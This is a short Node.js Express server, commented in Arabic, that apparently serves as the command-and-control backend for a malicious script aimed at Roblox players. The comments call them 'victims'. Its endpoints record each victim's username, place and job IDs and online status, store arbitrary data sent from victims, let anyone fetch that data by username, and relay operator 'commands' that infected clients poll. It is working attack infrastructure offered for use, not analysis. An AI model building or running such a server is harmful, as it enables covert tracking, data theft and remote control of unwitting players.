const express = require('express');
const app = express();
app.use(express.json());

let activePlayers = {}; // قاعدة بيانات اللاعبين في الذاكرة
let chatData = { username: "System", message: "No Command", time: Date.now() };
let victimInfo = {}; // لتخزين معاملات الضحايا

// استقبال إشارة الضحية
app.post('/ping', (req, res) => {
    const { username, placeId, jobId } = req.body;
    if (username) {
        activePlayers[username] = {
            placeId: placeId,
            jobId: jobId,
            lastSeen: Date.now()
        };
    }
    res.send("Updated");
});

// استقبال معاملات الضحية
app.post('/info', (req, res) => {
    const { username, data } = req.body;
    if (username && data) {
        victimInfo[username] = {
            ...data,
            receivedAt: Date.now()
        };
        console.log(`📊 معلومات جديدة من: ${username}`);
        res.json({ status: "received" });
    } else {
        res.status(400).json({ error: "بيانات ناقصة" });
    }
});

// جلب معاملات الضحية
app.get('/getinfo', (req, res) => {
    const username = req.query.username;
    const info = victimInfo[username];
    
    if (info) {
        const now = Date.now();
        if (now - info.receivedAt < 30000) { // معلومات حديثة خلال 30 ثانية
            res.json(info);
        } else {
            res.status(404).json({ status: "المعلومات منتهية الصلاحية" });
        }
    } else {
        res.status(404).json({ status: "لا توجد معلومات" });
    }
});

app.get('/players', (req, res) => {
    const now = Date.now();
    const onlineList = Object.keys(activePlayers).filter(user => (now - activePlayers[user].lastSeen) < 12000);
    res.json(onlineList);
});

app.post('/update', (req, res) => {
    chatData = { username: req.body.username, message: req.body.message, time: Date.now() };
    res.send("OK");
});

app.get('/data', (req, res) => res.json(chatData));

app.listen(process.env.PORT || 3000, () => console.log('🟢 السيرفر يعمل على المنفذ ' + (process.env.PORT || 3000)));
